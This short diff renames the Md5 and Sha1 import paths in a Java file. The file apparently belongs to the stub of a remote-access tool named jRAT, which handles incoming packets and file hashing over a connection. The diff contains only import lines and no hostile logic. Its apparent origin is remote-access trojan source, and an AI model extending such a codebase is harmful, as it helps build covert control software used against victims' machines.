@@ -2,8 +2,8 @@ package pro.jrat.stub.packets.incoming;
 
 import java.io.File;
 
-import pro.jrat.common.codec.Md5;
-import pro.jrat.common.codec.Sha1;
+import pro.jrat.common.hash.Md5;
+import pro.jrat.common.hash.Sha1;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet46FileHash;
 
